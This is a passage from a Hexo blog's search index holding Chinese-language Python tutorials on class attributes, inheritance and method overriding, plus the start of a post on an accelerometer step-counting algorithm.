class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> (<span class="string">&quot;animals.__doc__:&quot;</span>, animals.__doc__)</span><br><span class="line"><span class="comment">#输出类中的标识信息</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;animals.__name__:&quot;</span>, animals.__name__)</span><br><span class="line"><span class="comment">#输出类名</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;animals.__module__:&quot;</span>, animals.__module__)</span><br><span class="line"><span class="comment">#输出类所在的模块（类的全名是&#x27;__main__.className&#x27;，如果类位于一个导入模块mymod中，那么className.__module__ 等于 mymod）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;animals.__bases__:&quot;</span>, animals.__bases__)</span><br><span class="line"><span class="comment">#输出类的所有父类构成元素（包含了一个由所有父类组成的元组）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;animals.__dict__:&quot;</span>, animals.__dict__)</span><br><span class="line"><span class="comment">#输出类的所有清单属性</span></span><br></pre></td></tr></table></figure><p><strong>运行截图</strong><img src="/2020/09/10/Python/Python%E7%9A%84%E7%B1%BB/image-20200910175222544.png" class="lazyload" data-srcset="/2020/09/10/Python/Python%E7%9A%84%E7%B1%BB/image-20200910175222544.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200910175222544"></p><h1 id="4-类的继承"><a href="#4-类的继承" class="headerlink" title="4.类的继承"></a>4.类的继承</h1><p>面向对象的编程带来的主要好处之一是代码的重用，实现这种重用的方法之一是通过继承机制。</p><p>通过继承创建的新类称为<strong>子类</strong>或<strong>派生类</strong>，被继承的类称为<strong>基类</strong>、<strong>父类</strong>或<strong>超类</strong>。</p><p><strong>继承语法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 派生类名(<span class="params">基类名</span>)</span></span><br><span class="line"><span class="class">    ...</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">A</span>:</span>        <span class="comment"># 定义类 A</span></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span>         <span class="comment"># 定义类 B</span></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>(<span class="params">A, B</span>):</span>   <span class="comment"># 继承类 A 和 B</span></span><br><span class="line">.....</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>例子</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span>:</span>  <span class="comment"># 定义父类</span></span><br><span class="line">    <span class="comment">#父类中的变量</span></span><br><span class="line">    parentAttr = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;调用父类构造函数&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parentMethod</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;调用父类方法&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setAttr</span>(<span class="params">self, attr</span>):</span></span><br><span class="line">        Parent.parentAttr = attr</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getAttr</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;父类属性 :&quot;</span>, Parent.parentAttr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span>(<span class="params">Parent</span>):</span>  <span class="comment"># 定义子类</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;调用子类构造方法&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">childMethod</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;调用子类方法&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = Child()  <span class="comment"># 实例化子类</span></span><br><span class="line">c.childMethod()  <span class="comment"># 调用子类的方法</span></span><br><span class="line">c.parentMethod()  <span class="comment"># 调用父类方法</span></span><br><span class="line">c.setAttr(<span class="number">200</span>)  <span class="comment"># 再次调用父类的方法 - 设置属性值</span></span><br><span class="line">c.add=<span class="number">1000</span></span><br><span class="line"><span class="built_in">print</span>(c.add)</span><br><span class="line">c.getAttr()  <span class="comment"># 再次调用父类的方法 - 获取属性值</span></span><br></pre></td></tr></table></figure><p><strong>运行截图</strong>：<img src="/2020/09/10/Python/Python%E7%9A%84%E7%B1%BB/image-20200910175902991.png" class="lazyload" data-srcset="/2020/09/10/Python/Python%E7%9A%84%E7%B1%BB/image-20200910175902991.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200910175902991"></p><h1 id="5-子类重写父类方法"><a href="#5-子类重写父类方法" class="headerlink" title="5.子类重写父类方法"></a>5.子类重写父类方法</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span>:</span>        <span class="comment"># 定义父类</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">myMethod</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="built_in">print</span> <span class="string">&#x27;调用父类方法&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span>(<span class="params">Parent</span>):</span> <span class="comment"># 定义子类</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">myMethod</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="built_in">print</span> <span class="string">&#x27;调用子类方法&#x27;</span></span><br><span class="line"> </span><br><span class="line">c = Child()          <span class="comment"># 子类实例</span></span><br><span class="line">c.myMethod()         <span class="comment"># 子类调用重写方法</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法-三轴加速器计步算法</title>
      <link href="/2020/09/10/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E4%B8%89%E8%BD%B4%E5%8A%A0%E9%80%9F%E5%99%A8%E8%AE%A1%E6%AD%A5%E7%AE%97%E6%B3%95/"/>
      <url>/2020/09/10/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E4%B8%89%E8%BD%B4%E5%8A%A0%E9%80%9F%E5%99%A8%E8%AE%A1%E6%AD%A5%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://blog.csdn.net/dancer__sky/article/details/81504778">https://blog.csdn.net/dancer__sky/article/details/81504778</a></p><h1 id="均值滤波器—滤波"><a href="#均值滤波器—滤波" class="headerlink" title="均值滤波器—滤波"></a><strong>均值滤波器—滤波</strong></h1><h1 id="动态阈值"><a href="#动态阈值" class="headerlink" title="动态阈值"></a><strong>动态阈值</strong></h1><h1 id="动态精度"><a href="#动态精度" class="headerlink" title="动态精度"></a>动态精度</h1><h1 id="步伐判断"><a href="#步伐判断" class="headerlink" title="步伐判断"></a>步伐判断</h1><h1 id="均值滤波器—滤波-1"><a href="#均值滤波器—滤波-1" class="headerlink" title="均值滤波器—滤波"></a><strong>均值滤波器—滤波</strong></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#加速度 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">axis_info_t</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,x,y,z</span>):</span></span><br><span class="line">        self.x=x</span><br><span class="line">        self.y=y</span><br><span class="line">        self.z=z</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#平均加速度 4个数组</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">axis_all</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,a,b,c,d</span>):</span></span><br><span class="line">        self.a=a</span><br><span class="line">        self.b=b</span><br><span class="line">        self.c=c</span><br><span class="line">        self.d=d</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#动态阈值</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">peak_value_t</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,newmax,newmin,oldmax,oldmin</span>):</span></span><br><span class="line">        self.newmax = newmax</span><br><span class="line">        self.newmin = newmin</span><br><span class="line">        self.oldmax = oldmax</span><br><span class="line">        self.oldmin = oldmin</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#动态精度：这其实是由一个线性移位寄存器加上一个我们预设定的动态变化值来消除高频噪声。 移位寄存器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">slid_reg</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,new_sample,old_sample</span>):</span></span><br><span class="line">        self.new_sample=new_sample</span><br><span class="line">        self.old_sample=old_sample</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
